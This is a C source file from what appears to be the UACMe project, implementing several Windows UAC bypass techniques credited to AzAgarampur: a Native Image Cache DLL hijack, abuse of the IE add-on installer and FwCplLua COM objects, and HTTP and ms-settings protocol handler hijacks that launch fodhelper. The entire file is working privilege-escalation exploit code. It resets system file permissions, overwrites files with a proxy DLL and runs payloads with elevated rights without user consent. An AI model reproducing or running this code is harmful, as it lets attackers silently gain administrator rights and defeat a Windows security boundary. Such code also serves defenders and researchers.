/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       AZAGARAMPUR.C
*
*  VERSION:     3.54
*
*  DATE:        26 Dec 2020
*
*  UAC bypass methods from AzAgarampur.
* 
*  For description please visit original URL
* 
*  https://github.com/AzAgarampur/byeintegrity-uac
*  https://github.com/AzAgarampur/byeintegrity2-uac
*  https://github.com/AzAgarampur/byeintegrity3-uac
*  https://github.com/AzAgarampur/byeintegrity4-uac
*  https://github.com/AzAgarampur/byeintegrity-lite
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* ucmxNgenLogLastWrite
*
* Purpose:
*
* Query ngen.log last write time.
*
*/
BOOL ucmxNgenLogLastWrite(
    _Out_ FILETIME* LastWriteTime
)
{
    BOOL bResult = FALSE;
    HANDLE hFile;
    WCHAR szFileName[MAX_PATH * 2];

    LastWriteTime->dwLowDateTime = 0;
    LastWriteTime->dwHighDateTime = 0;

    _strcpy(szFileName, g_ctx->szSystemRoot);
    _strcat(szFileName, MSNETFRAMEWORK_DIR);

#ifdef _WIN64
    _strcat(szFileName, TEXT("64"));
#endif

    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, NET4_DIR);
    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, TEXT("ngen.log"));

    hFile = CreateFile(szFileName,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        bResult = GetFileTime(hFile, NULL, NULL, LastWriteTime);
        CloseHandle(hFile);
    }

    return bResult;
}

/*
* ucmNICPoisonMethod
*
* Purpose:
*
* Bypass UAC by by Dll hijack of Native Image Cache.
*
*/
NTSTATUS ucmNICPoisonMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szFileName[MAX_PATH * 2];
    WCHAR szTargetProc[MAX_PATH * 2];
    DWORD origSize = 0, bytesIO;
    PBYTE origFileBuffer = NULL;

    HANDLE hFile;

    LPWSTR oldSecurity = NULL;
    LPWSTR lpAssemblyFilePath = NULL, lpTargetFileName = NULL;

    BOOLEAN IsWin7;

#ifdef _DEBUG
    BOOLEAN bWaitFailed = FALSE;
#endif

    FILETIME lastWriteTime, checkTime;

    INT iRetryCount = 20;

    GUID targetMVID;
    FUSION_SCAN_PARAM scanParam;

    do {

        IsWin7 = (g_ctx->dwBuildNumber < 9200);

        if (!supInitFusion(IsWin7 ? 2 : 4))
            break;

        if (!supFusionGetAssemblyPathByName(TEXT("Accessibility"), &lpAssemblyFilePath))
            break;

        if (!supFusionGetImageMVID(lpAssemblyFilePath, &targetMVID))
            break;

        if (!IsWin7) {

            ucmxNgenLogLastWrite(&lastWriteTime);

            //
            // Run NET maintenance tasks.
            //
            _strcpy(szFileName, g_ctx->szSystemDirectory);
            _strcat(szFileName, MSCHEDEXE_EXE);

            if (!supRunProcess2(szFileName,
                TEXT("Start"),
                NULL,
                SW_HIDE,
                SUPRUNPROCESS_TIMEOUT_DEFAULT))
            {
                break;
            }

            //
            // Wait for task completion.
            //

#ifdef _DEBUG
            bWaitFailed = TRUE;
#endif

            do {

                Sleep(2000);

                if (FALSE == supIsProcessRunning(TEXT("ngentask.exe"))) {

                    if (ucmxNgenLogLastWrite(&checkTime)) {

                        if (CompareFileTime(&lastWriteTime, &checkTime) < 0) {
#ifdef _DEBUG
                            bWaitFailed = FALSE;
#endif
                            break;
                        }
                    }

                }

                --iRetryCount;

            } while (iRetryCount);

        }

#ifdef _DEBUG
        if (bWaitFailed) {
            OutputDebugString(TEXT(">>wait failed"));
            DebugBreak();
        }
#endif

        //
        // Locate target NI file.
        //
        scanParam.ReferenceMVID = &targetMVID;
        scanParam.lpFileName = NULL;

        _strcpy(szFileName, g_ctx->szSystemRoot);
        _strcat(szFileName, TEXT("assembly\\NativeImages_"));
        if (IsWin7)
            _strcat(szFileName, NET2_DIR);
        else
            _strcat(szFileName, NET4_DIR);

#ifdef _WIN64
        _strcat(szFileName, TEXT("_64"));
#else
        _strcat(szFileName, TEXT("_32"));
#endif
        _strcat(szFileName, TEXT("\\Accessibility\\"));

        if (!supFusionScanDirectory(szFileName,
            TEXT("*.dll"),
            (pfnFusionScanFilesCallback)supFusionFindFileByMVIDCallback,
            &scanParam))
        {
            break;
        }

        lpTargetFileName = scanParam.lpFileName;
        if (lpTargetFileName == NULL)
            break;

        //
        // Read existing file to memory.
        //
        origFileBuffer = supReadFileToBuffer(lpTargetFileName, &origSize);
        if (origFileBuffer == NULL)
            break;

        //
        // Remember old file security permissions.
        //
        oldSecurity = NULL;
        if (!ucmMasqueradedGetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            &oldSecurity))
        {
            break;
        }

        //
        // Reset target file permissions.
        //
        if (!ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            T_SDDL_ALL_FOR_EVERYONE))
        {
            break;
        }

        //
        // Overwrite file with Fubuki.
        //
        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, ProxyDll, ProxyDllSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }
        else
            break;

        //
        // Run target.
        //
        _strcpy(szTargetProc, g_ctx->szSystemDirectory);
        _strcat(szTargetProc, MMC_EXE);

        if (supRunProcess2(szTargetProc,
            WF_MSC,
            NULL,
            SW_HIDE,
            SUPRUNPROCESS_TIMEOUT_DEFAULT))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (lpAssemblyFilePath)
        supHeapFree(lpAssemblyFilePath);

    //
    // Restore original file contents and permissions.
    //
    if (origFileBuffer && lpTargetFileName) {

        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }

        supVirtualFree(origFileBuffer, NULL);

        if (oldSecurity) {

            ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
                DACL_SECURITY_INFORMATION,
                SE_FILE_OBJECT,
                oldSecurity);

            CoTaskMemFree(oldSecurity);
        }

        supHeapFree(lpTargetFileName);
    }

    return MethodResult;
}

/*
* ucmIeAddOnInstallMethod
*
* Purpose:
*
* Bypass UAC by IE Admin Add-On Installer COM object.
*
*/
NTSTATUS ucmIeAddOnInstallMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT  r = E_FAIL, hr_init;

    IIEAdminBrokerObject* BrokerObject = NULL;
    IActiveXInstallBroker* InstallBroker = NULL;

    BSTR adminInstallerUuid = NULL;
    BSTR cacheItemFilePath = NULL, fileToVerify = NULL;

    ULONG dummy = 0;
    PUCHAR dummyPtr = NULL;

    PWCHAR lpPayloadFile = NULL, lpTargetDir = NULL, lpFileName = NULL, lpDirectory = NULL;
    SIZE_T cchBuffer;

    HANDLE processHandle = NULL;

    BSTR workdirBstr, emptyBstr;

    WCHAR szDummyTarget[MAX_PATH * 2];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // VerifyFile required.
        //
        r = CoInitializeSecurity(NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_CONNECT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL);

        if (FAILED(r)) {
            break;
        }

        //
        // Allocated elevated factory object.
        //
        r = ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
            &IID_IEAxiAdminInstaller,
            CLSCTX_LOCAL_SERVER,
            &BrokerObject);

        if (FAILED(r)) {
            break;
        }

        r = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
            NULL,
            0,
            &adminInstallerUuid);

        if (FAILED(r)) {
            break;
        }

        //
        // Query install broker object.
        //
        r = BrokerObject->lpVtbl->QueryInterface(BrokerObject,
            &IID_IEAxiInstaller2,
            &InstallBroker);

        if (FAILED(r)) {
            break;
        }

        _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
        _strcat(szDummyTarget, CONSENT_EXE);

        r = E_FAIL;

        //
        // Verify image embedded signature.
        // Uppon success copy given file to the temporary directory and return full filepath.
        //
        fileToVerify = SysAllocString(szDummyTarget);
        if (fileToVerify) {

            r = InstallBroker->lpVtbl->VerifyFile(InstallBroker,
                adminInstallerUuid,
                (HWND)INVALID_HANDLE_VALUE,
                fileToVerify,
                fileToVerify,
                NULL,
                WTD_UI_NONE,
                WTD_UICONTEXT_EXECUTE,
                &IID_IUnknown,
                &cacheItemFilePath,
                &dummy,
                &dummyPtr);

            if (dummyPtr)
                CoTaskMemFree(dummyPtr);

            SysFreeString(fileToVerify);
        }

        if (FAILED(r)) {
            break;
        }

        //
        // Kill file in cache
        //
        if (!ucmMasqueradedDeleteDirectoryFileCOM(cacheItemFilePath))
            break;

        //
        // Replace file in cache with Fubuki.
        //
        cchBuffer = (SIZE_T)SysStringLen(cacheItemFilePath);
        lpPayloadFile = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpPayloadFile == NULL)
            break;

        lpTargetDir = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpTargetDir == NULL)
            break;

        lpFileName = _filename(cacheItemFilePath);
        if (lpFileName == NULL)
            break;

        _strcpy(lpPayloadFile, g_ctx->szTempDirectory);
        _strcat(lpPayloadFile, lpFileName);

        if (!supWriteBufferToFile(lpPayloadFile, ProxyDll, ProxyDllSize))
            break;

        lpDirectory = _filepath(cacheItemFilePath, lpTargetDir);
        if (lpDirectory == NULL)
            break;

        if (!ucmMasqueradedMoveCopyFileCOM(lpPayloadFile, lpDirectory, TRUE))
            break;

        //
        // Run file from cache.
        //
        workdirBstr = SysAllocString(g_ctx->szTempDirectory);
        if (workdirBstr) {

            emptyBstr = SysAllocString(TEXT(""));
            if (emptyBstr) {

                r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
                    adminInstallerUuid,
                    NULL,
                    cacheItemFilePath,
                    emptyBstr,
                    workdirBstr,
                    emptyBstr,
                    4, //RSC_FLAG_QUIET
                    &processHandle); //there is always no process handle on output, ignore.

                SysFreeString(emptyBstr);
            }

            SysFreeString(workdirBstr);

            if (r == E_INVALIDARG)
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Post execution cleanup.
    //

    if (InstallBroker)
        InstallBroker->lpVtbl->Release(InstallBroker);

    if (BrokerObject)
        BrokerObject->lpVtbl->Release(BrokerObject);

    if (adminInstallerUuid)
        SysFreeString(adminInstallerUuid);

    if (MethodResult == STATUS_SUCCESS) {
        if (lpDirectory) {
            ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
        }
    }

    if (cacheItemFilePath)
        SysFreeString(cacheItemFilePath);

    if (lpTargetDir)
        supHeapFree(lpTargetDir);

    if (lpPayloadFile)
        supHeapFree(lpPayloadFile);

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmWscActionProtocolMethod
*
* Purpose:
*
* Bypass UAC by SecurityCenter COM object and HTTP protocol registry hijack.
*
*/
NTSTATUS ucmWscActionProtocolMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT  r = E_FAIL, hr_init;
    IWscAdmin* WscAdminObject = NULL;

    LPOLESTR protoGuidString = NULL;
    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult))
            break;

        MethodResult = supRegisterShellAssoc(T_PROTO_HTTP,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            FALSE);

        if (!NT_SUCCESS(MethodResult))
            break;

        MethodResult = STATUS_ACCESS_DENIED;

        r = ucmAllocateElevatedObject(T_CLSID_SecurityCenter,
            &IID_WscAdmin,
            CLSCTX_LOCAL_SERVER,
            &WscAdminObject);

        if (FAILED(r))
            break;

        r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
        if (FAILED(r))
            break;

        r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);

        Sleep(1000);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup.
    //
    if (WscAdminObject)
        WscAdminObject->lpVtbl->Release(WscAdminObject);

    if (protoGuidString) {

        supUnregisterShellAssoc(T_PROTO_HTTP,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmFwCplLuaMethod2
*
* Purpose:
*
* Bypass UAC using FwCplLua undocumented COM interface and shell association registry hijack.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* Note:
*
* Protocol name defined as const (e.g. pe386).
* ProgId generated with CoCreateGuid and will be different each run.
*
*/
NTSTATUS ucmFwCplLuaMethod2(
    _In_ LPWSTR lpszPayload
)
{
    BOOL fEnvSet = FALSE, fDirCreated = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT r = E_FAIL, hr_init;
    ULONG DataSize = 0, SnapinSize = 0;
    SIZE_T nLen, PayloadDirNameLen = 0, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0, ProtocolNameLen;
    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
    PVOID ImageBaseAddress = g_hInstance;
    LPOLESTR protoGuidString = NULL;
    CHAR* pszMarker;
    IFwCplLua* FwCplLua = NULL;

    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szPayloadDir[MAX_PATH * 2];
    CHAR szProtocol[MAX_PATH];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
    RtlSecureZeroMemory(&szPayloadDir, sizeof(szPayloadDir));

    do {

        //
        // Create GUID.
        //
        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        //
        // Convert protocol name to ANSI to be used in msc modification next.
        //
        ProtocolNameLen = _strlen(MYSTERIOUSCUTETHING);
        RtlSecureZeroMemory(szProtocol, sizeof(szProtocol));
        WideCharToMultiByte(CP_ACP, 0,
            MYSTERIOUSCUTETHING,
            -1,
            szProtocol,
            sizeof(szProtocol),
            NULL,
            NULL);

        _strcat_a(szProtocol, ":");

        //
        // Decrypt and decompress custom Kamikaze snap-in.
        //
        SnapinResource = supLdrQueryResourceData(
            KAMIKAZE_ID,
            ImageBaseAddress,
            &DataSize);

        if (SnapinResource) {
            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
            if (SnapinData == NULL)
                break;
        }
        else
            break;

        //
        // Create destination dir "system32" in %temp%
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
        PayloadDirNameLen = _strlen(szPayloadDir);
        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        fDirCreated = TRUE;

        //
        // Set new %windir% environment variable.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);

        nLen = _strlen(szBuffer);
        if (szBuffer[nLen - 1] == L'\\') {
            szBuffer[nLen - 1] = 0;
        }

        fEnvSet = supSetEnvVariable(FALSE, NULL, T_WINDIR, szBuffer);
        if (fEnvSet == FALSE)
            break;

        //
        // Find UserAssocSet
        //
        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Register shell protocol.
        //
        MethodResult = supRegisterShellAssoc(MYSTERIOUSCUTETHING,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            TRUE);

        if (!NT_SUCCESS(MethodResult))
            break;

        MscBufferSize = ALIGN_UP_BY(1 + (SIZE_T)SnapinSize + (SIZE_T)sizeof(szProtocol), (SIZE_T)PAGE_SIZE);
        MscBufferPtr = supVirtualAlloc(
            &MscBufferSize,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE, NULL);
        if (MscBufferPtr == NULL)
            break;

        //
       // Reconfigure msc snapin and write it to the %temp%\system32.
       //
        pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
        if (pszMarker) {

            //
            // Copy first part of snapin (unchanged).
            //
            MscBytesIO = (ULONG)(pszMarker - (PCHAR)SnapinData);
            MscSize = MscBytesIO;
            RtlCopyMemory(MscBufferPtr, SnapinData, MscBytesIO);

            //
            // Copy modified part.
            //

            MscBytesIO = ProtocolNameLen;

            //Include ":" element.
            MscBytesIO++;

            //Copy guid.
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), (PVOID)&szProtocol, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Copy all of the rest.
            //
            while (*pszMarker != 0 && *pszMarker != '<') {
                pszMarker++;
            }

            MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Write result to the file.
            //
            _strcat(szPayloadDir, TEXT("\\"));
            _strcat(szPayloadDir, WF_MSC);
            if (!supWriteBufferToFile(szPayloadDir, MscBufferPtr, (ULONG)MscSize))
                break;

            supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
            MscBufferPtr = NULL;
        }

        //
        // Get elevated COM object for FwCplLua interface.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_FwCplLua,
            &IID_IFwCplLua,
            CLSCTX_LOCAL_SERVER,
            &FwCplLua);

        if (r != S_OK)
            break;

        if (FwCplLua == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Execute method from FwCplLua interface.
        // This will trigger our payload as shell will attempt to run it.
        //
        r = FwCplLua->lpVtbl->LaunchAdvancedUI(FwCplLua);
        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup.
    //
    if (MscBufferPtr) {
        supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
    }
    if (SnapinData) {
        supSecureVirtualFree(SnapinData, SnapinSize, NULL);
    }

    if (FwCplLua != NULL) {
        FwCplLua->lpVtbl->Release(FwCplLua);
    }

    Sleep(2000);

    if (protoGuidString) {

        supUnregisterShellAssoc(MYSTERIOUSCUTETHING,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    if (fEnvSet)
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);

    if (fDirCreated) {
        DeleteFile(szPayloadDir);
        szPayloadDir[PayloadDirNameLen] = 0;
        RemoveDirectory(szPayloadDir);
    }

    return MethodResult;
}

/*
* ucmMsSettignsProtocolMethod
*
* Purpose:
*
* Bypass UAC by registering own ms-settings protocol.
*
*/
NTSTATUS ucmMsSettignsProtocolMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init;

    LPOLESTR protoGuidString = NULL;
    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;

    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));

    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    do {

        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        //
        // Find UserAssocSet
        //
        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Register shell protocol.
        //
        MethodResult = supRegisterShellAssoc(T_MSSETTINGS,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            TRUE);

        if (NT_SUCCESS(MethodResult)) {

            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, FODHELPER_EXE);

            MethodResult = supRunProcess(szBuffer, NULL) ?
                STATUS_SUCCESS : STATUS_ACCESS_DENIED;

        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (protoGuidString) {

        supUnregisterShellAssoc(T_MSSETTINGS,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return MethodResult;
}
